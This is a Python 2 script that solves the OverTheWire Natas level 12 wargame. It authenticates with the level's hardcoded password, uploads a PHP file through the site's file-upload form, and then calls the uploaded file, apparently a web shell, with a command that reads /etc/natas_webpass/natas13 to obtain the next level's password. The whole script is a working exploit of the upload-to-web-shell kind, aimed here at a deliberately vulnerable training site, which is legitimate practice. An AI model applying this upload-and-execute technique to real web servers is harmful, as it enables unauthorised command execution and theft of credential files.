#!/usr/bin/env python


import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )
response = session.post(url, files = { "uploadedfile" : open('natas12.php', 'rb') }, data = { "filename" : "natas12.php", "MAX_FILE_SIZE" : "1000" }, auth = (username, password) )

response = session.get( url + 'upload/bwur7jic87.php?c=cat /etc/natas_webpass/natas13', auth = (username, password ))


content = response.text

print content
